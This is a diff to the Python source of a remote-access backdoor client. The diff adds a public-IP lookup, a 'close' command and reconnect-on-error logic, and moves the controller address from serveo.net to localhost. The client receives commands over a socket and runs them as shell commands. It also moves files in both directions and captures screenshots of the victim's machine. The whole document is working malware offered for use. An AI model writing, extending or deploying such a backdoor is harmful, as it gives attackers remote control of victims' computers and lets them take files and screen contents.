@@ -1,11 +1,12 @@
+import base64
 import io
+import os
 import socket
 import subprocess
-import os
-import base64
-from PIL import ImageGrab
-import simplejson as json
 import time
+import requests
+import simplejson as json
+from PIL import ImageGrab
 
 
 def read_file(path):
@@ -47,6 +48,15 @@ def get_hostname():
     return socket.gethostname()
 
 
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org')
+        if response.status_code == 200:
+            return response.text
+    except Exception as e:
+        print("Hata:", e)
+
+
 def screenshot_file():
     screenshot = ImageGrab.grab()
     img_stream = io.BytesIO()
@@ -85,11 +95,15 @@ class MySocket:
         while True:
             self.connect()
             while True:
+                command_output = ''
                 try:
                     command = self.json_recv()
+                    print(command)
                     if command[0] == 'quit':
                         self.my_connection.close()
                         exit()
+                    elif command[0] == 'close':
+                        self.my_connection.close()
                     elif command[0] == 'cd' and len(command) > 1:
                         command_output = cd_command(command[1])
                     elif command[0] == 'download':
@@ -98,22 +112,30 @@ class MySocket:
                         command_output = save_file(command[1], command[2])
                     elif command[0] == 'screenshot':
                         command_output = screenshot_file()
+                    elif command[0] == 'public_ip':
+                        command_output = get_public_ip()
                     else:
                         command_output = command_execution(command)
                     self.json_send(command_output)
 
                 except WindowsError as e:
                     print(str(e))
-                    time.sleep(3)
+                    time.sleep(2)
+                    start()
 
-                except Exception as e:
+                except AttributeError as e:
                     print(f"An error occurred: {str(e)}")
                     self.json_send('The command entered is invalid')
 
+                except Exception as e:
+                    print(f"An error occurred: {str(e)}")
+                    self.json_send('Backdoor error')
+
 
 def start():
+    # time.sleep(1)
     try:
-        my_socket_object = MySocket('serveo.net', 9696)
+        my_socket_object = MySocket('localhost', 8080)
         my_socket_object.start_socket()
     except Exception as ex:
         print(ex)
